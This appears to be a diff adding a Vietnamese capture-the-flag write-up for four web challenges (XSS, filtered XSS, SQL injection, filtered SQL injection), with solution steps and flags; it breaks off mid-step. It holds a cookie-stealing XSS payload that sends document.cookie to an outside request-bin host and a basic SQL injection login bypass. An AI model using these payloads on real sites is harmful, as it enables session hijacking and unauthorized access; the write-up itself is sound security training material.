@@ -578,3 +578,89 @@ Bước 2: "Những thay đổi trong quá khứ đều được lưu lại và 
 
 **Flag{no_where_to_hide_gitleaks}**
 
+## WEB EXPLOITATION
+### Bài 1: XSS
+Các cậu còn nhớ sự kiện Livestream lần đầu tiên của Hazy , có một số bạn đã nghịch ngợm làm bay màu cái Chatbox. Đố bạn cho bay màu chal12 này đấy.
+
+> http://chal12.web.letspentest.org/
+
+### ***Cách giải:***
+
+Bước 1: Đầu tiên ta thử để chắc rằng trang này bị xss : <script>alert("lmaoXD")</script>
+
+> ![image](https://user-images.githubusercontent.com/90112096/140524591-ea0ae444-443f-4f41-9019-c6942c778aae.png)
+
+Bước 2: Việc của ta bây giờ là đi chôm cookie :3, mình xài payload sau:
+
+> <script>document.write("<img src='your_link/"+document.cookie+"'>");</script>
+
+Bước 3: Để nhận request, mình sử dụng trang postb.in
+
+> <script>document.write("<img src='https://postb.in/1636121993357-5448687351308/"+document.cookie+"'>");</script>
+
+> ![image](https://user-images.githubusercontent.com/90112096/140525437-6402649e-bbb5-4e67-8bc3-37553086b207.png)
+
+Bước 4: Sau đấy mình chỉ cần đợi flag gửi về thôi keke :>> 
+
+> ![image](https://user-images.githubusercontent.com/90112096/140525471-e3c7cc1c-874d-4099-abc5-c12330dba8af.png)
+
+**FLAG{10c802c9c6afc26769764b5b986d708a}**
+
+### Bài 2: XSS FILTER
+Có vẻ như Chall12 là quá dễ với các bạn, thế còn lọc bớt một số kí tự thì sao :)
+
+> http://chal15.web.letspentest.org/
+
+### ***Cách giải:***
+
+Tại bài này ta có thể sử dụng lại payload ở trên nên cách làm tương tự thôi hehe :33333
+
+> ![image](https://user-images.githubusercontent.com/90112096/140525948-a66b16c8-7c85-4bcf-bc71-455dcb2b3c51.png)
+
+**FLAG{5b7eca261028a4042fde4e3f45dec294}**
+
+### Bài 3: ÉT QUY EO 
+Đây là một lỗ hổng rất cơ bản nhưng lại dễ dàng bị bỏ qua trong quá trình phát triển ứng dụng.
+
+Lỗ hổng này nguy hiểm tới mức cho phép các h@cker lấy quyền quản trị của website, thay đổi nội dung, lợi dụng để ăn cắp các thông tin nhạy cảm, hoặc thậm chí làm bàn đạp tấn công chiếm quyền quản trị toàn hệ thống.
+
+Đây là phương thức tấn công yêu thích của Hacker khi lần đầu tiếp cận với website của bạn
+
+> http://chal13.web.letspentest.org/
+
+### ***Cách giải:***
+
+Bước 1: Như tên đề thì mình biết rằng đây là lổ hổng SQL, việc mình làm là đi tìm SQL Injection Payload
+
+> https://github.com/payloadbox/sql-injection-payload-list
+
+Bước 2: Sau khi thử vài cái thì mình sử dụng được payload 
+
+> ' OR 1 -- -
+
+> ![image](https://user-images.githubusercontent.com/90112096/140526515-b5489f40-d968-42ca-9e22-056d9ad783ad.png)
+
+Bước 3: Sau đó mình decode đoạn " RmxhZ3tGcjMzX1N0eWwzfQ== " sang ASCII và lấy được flag
+
+> ![image](https://user-images.githubusercontent.com/90112096/140526622-2ed4008b-61bc-470b-b214-b7ff96553ebb.png)
+
+**Flag{Fr33_Styl3}**
+
+### Bài 4: SQL FILTER 
+> http://chal14.web.letspentest.org/
+
+### ***Cách giải:***
+
+Bước 1: Sau khi kiểm tra thì mình thấy không thể xài payload cũ được nữa nên mình dùng BurpSuite để xem đã bị lọc bớt kí tự nào
+
+> ![image](https://user-images.githubusercontent.com/90112096/140527183-eaa06f44-2071-496f-b4f8-28dd06ca8e9d.png)
+
+Bước 2: Payload của ta được gửi là "%27+OR+1+--+-" hay nói cách khác là payload đã bị lượt bỏ đi dấu cách
+
+> ![image](https://user-images.githubusercontent.com/90112096/140527310-0e497524-01d6-4fc7-b3d2-3ff871ec5b97.png)
+
+Bước 3: Tiếp theo mình đi tìm SQL Filter ByPass
+
+> https://portswigger.net/support/sql-injection-bypassing-common-filters
+
+Bước 4: Sau đó, gửi lại payload và ta nhận được flag 
